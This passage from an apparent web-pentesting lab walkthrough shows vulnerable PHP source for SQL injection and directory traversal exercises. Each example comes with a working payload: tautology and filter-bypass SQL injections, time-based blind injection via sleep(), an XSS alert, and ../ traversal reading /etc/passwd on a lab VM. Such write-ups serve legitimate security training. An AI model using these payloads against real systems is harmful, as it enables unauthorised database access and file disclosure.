<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<h3>SQL injections</h3>

<p><strong>Example1</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/sql1.png" title="sqli" alt="sql injection"></p>

<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>   
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>    
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/sqlinj1.png" title="sqli" alt="sqli results"></p>

<p><strong>Example2</strong></p>

<p>This example looks the same like the previous one, but the difference is in the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/ /&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>

<p><strong>Example3</strong></p>

<p>Same-looking page, but slightly different code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\s+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'/**/or/**/1=1#</span></code></pre></td></tr></table></div></figure>


<p>And the DB query would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="cm">/**/</span><span class="k">or</span><span class="cm">/**/</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As always, don&rsquo;t forget to URL encode when injecting!</p>

<p><strong>Example4</strong></p>

<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>

<p>And the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sql</span><span class="o">=</span><span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>

<p><strong>Example5</strong></p>

<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[0-9]+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>

<p><strong>Example6</strong></p>

<p>The developer tried to fix the previous mistake with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>

<p><strong>Example7</strong></p>

<p>Finally, the code checks for integers both at the beginning and the end:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^-?[0-9]+$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">];</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>

<blockquote><p> m (PCRE_MULTILINE)</p>

<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
end of the string, or before a terminating newline (unless D modifier is set). This is the same
as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
immediately following or immediately before any newline in the subject string, respectively, as
well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
modifier has no effect.</p></blockquote>

<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>

<p><strong>Example8</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/sql8.png" title="sqli" alt="sqli 8"></p>

<p>This example introduces the ORDER BY statement:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY `&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The SQL query looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="o">`</span><span class="k">INPUT</span><span class="o">`</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>order=name`,(select sleep(3) from dual where database() like database())#</span></code></pre></td></tr></table></div></figure>


<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="p">,(</span><span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span> <span class="k">where</span> <span class="k">database</span><span class="p">()</span> <span class="k">like</span> <span class="k">database</span><span class="p">())</span><span class="o">#`</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>

<p><strong>Example9</strong></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY &quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>order=(select sleep(3) from dual where database() like database())#</span></code></pre></td></tr></table></div></figure>


<h3>Directory traversal</h3>

<p><strong>Example1</strong></p>

<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$UploadDir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/files/&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Cache-Control: must-revalidate, post-check=0, pre-check=0&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Cache-Control: public&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: inline; filename=&quot;&#39;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;;&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Transfer-Encoding: binary&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span> <span class="o">.</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">do</span> <span class="p">{</span>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="mi">8192</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
</span><span class='line'><span class="k">exit</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/webpentester/passwd.png" title="passwd file" alt="passd file"></p>

<p><strong>Example2</strong></p>

<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;/var/www/files/&quot;</span><span class="p">)))</span>
</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>

<p><strong>Example 3</strong></p>

<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>

<p>And the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$UploadDir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/files/&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
</span><span class='line'><span class="c1">// Simulate null-byte issue that used to be in filesystem related functions in PHP</span>
</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\x00.*/&#39;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


